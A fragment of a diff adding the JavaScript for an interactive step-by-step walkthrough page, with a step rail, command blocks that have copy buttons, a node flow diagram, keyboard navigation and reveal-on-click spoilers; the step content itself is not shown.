+    for (var i = 0; i < STEPS.length; i++){
+      var s = STEPS[i];
+      h += '<div class="st' + (i === cur ? ' on' : '') + '" data-i="' + i + '">' +
+             '<span class="n">' + String(i + 1).padStart(2, "0") + '</span>' +
+             '<span><span class="t">' + s.title + '</span>' +
+             '<span class="h">' + s.host + '</span></span></div>';
+    }
+    el("railList").innerHTML = h;
+  }
+
+  function renderPanel(){
+    var s = STEPS[cur];
+    var node = NODES[s.node];
+
+    var tags = "";
+    for (var i = 0; i < s.tags.length; i++){
+      tags += '<span class="tag ' + (i === 0 ? 'g' : '') + '">' + s.tags[i] + '</span>';
+    }
+    el("pTags").innerHTML = tags;
+    el("pTitle").textContent = s.title;
+    el("pHost").textContent = s.host;
+    el("pBody").innerHTML = s.body;
+
+    var ch = "";
+    for (var j = 0; j < s.cmds.length; j++){
+      var c = s.cmds[j];
+      ch += '<div class="cmd"><div class="lbl"><span>' + c.l +
+            '</span><button class="cp" data-c="' + j + '">copy</button></div>' +
+            '<pre data-code="' + j + '"></pre></div>';
+    }
+    el("pCmds").innerHTML = ch;
+
+    var pres = el("pCmds").querySelectorAll("pre");
+    for (var k = 0; k < pres.length; k++){
+      pres[k].textContent = s.cmds[+pres[k].getAttribute("data-code")].c;
+    }
+
+    el("pMid").textContent = (cur + 1) + " / " + STEPS.length + " · " + node.name;
+    el("prog").style.width = Math.round(((cur + 1) / STEPS.length) * 100) + "%";
+    el("prev").disabled = cur === 0;
+    el("next").disabled = cur === STEPS.length - 1;
+
+    var allNodes = document.querySelectorAll(".node");
+    for (var m = 0; m < allNodes.length; m++){
+      allNodes[m].classList.toggle("on", allNodes[m].getAttribute("data-node") === s.node);
+    }
+
+    if (history.replaceState) history.replaceState(null, "", "#step-" + (cur + 1));
+  }
+
+  function go(i){
+    cur = Math.max(0, Math.min(STEPS.length - 1, i));
+    renderRail();
+    renderPanel();
+  }
+
+  function firstStepFor(nodeId){
+    for (var i = 0; i < STEPS.length; i++){
+      if (STEPS[i].node === nodeId) return i;
+    }
+    return 0;
+  }
+
+  el("railList").addEventListener("click", function(e){
+    var t = e.target.closest(".st");
+    if (t) go(+t.getAttribute("data-i"));
+  });
+
+  el("prev").addEventListener("click", function(){ go(cur - 1); });
+  el("next").addEventListener("click", function(){ go(cur + 1); });
+
+  document.addEventListener("keydown", function(e){
+    if (e.target.tagName === "INPUT" || e.target.tagName === "TEXTAREA") return;
+    if (e.key === "ArrowRight") { go(cur + 1); }
+    if (e.key === "ArrowLeft")  { go(cur - 1); }
+  });
+
+  el("flow").addEventListener("click", function(e){
+    var n = e.target.closest(".node");
+    if (n) go(firstStepFor(n.getAttribute("data-node")));
+  });
+
+  el("pCmds").addEventListener("click", function(e){
+    var b = e.target.closest(".cp");
+    if (!b) return;
+    var code = STEPS[cur].cmds[+b.getAttribute("data-c")].c;
+    var done = function(){ b.textContent = "copied"; setTimeout(function(){ b.textContent = "copy"; }, 1300); };
+    if (navigator.clipboard && navigator.clipboard.writeText){
+      navigator.clipboard.writeText(code).then(done, function(){ fallback(code); done(); });
+    } else { fallback(code); done(); }
+    function fallback(t){
+      var ta = document.createElement("textarea");
+      ta.value = t; document.body.appendChild(ta); ta.select();
+      document.execCommand("copy"); document.body.removeChild(ta);
+    }
+  });
+
+  document.addEventListener("click", function(e){
+    var s = e.target.closest(".spoiler");
+    if (!s) return;
+    if (!s.classList.contains("rev")){
+      s.textContent = s.getAttribute("data-v");
+      s.classList.add("rev");
+    } else {
+      s.textContent = s.getAttribute("data-v").slice(0, 10) + "\u2026";
+    }
+  });
+
+  var m = /#step-(\d+)/.exec(location.hash);
+  go(m ? (+m[1] - 1) : 0);
+})();
+</script>
+</body>
+</html>
